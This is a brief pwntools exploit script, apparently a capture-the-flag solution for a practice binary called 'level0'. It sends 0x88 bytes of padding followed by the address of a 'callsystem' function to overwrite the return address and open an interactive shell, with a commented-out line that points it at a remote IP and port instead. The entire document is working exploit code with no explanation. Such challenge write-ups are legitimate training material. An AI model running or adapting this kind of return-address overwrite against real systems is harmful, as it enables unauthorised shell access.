from pwn import *

p = process("./level0")
elf = ELF("./level0")
#p = remote('10.10.49.194', 30154)

padding = "A"*0x88
addr = elf.symbols["callsystem"]

payload = ""
payload += padding
payload +=p64(addr)

p.send(payload)
p.interactive()
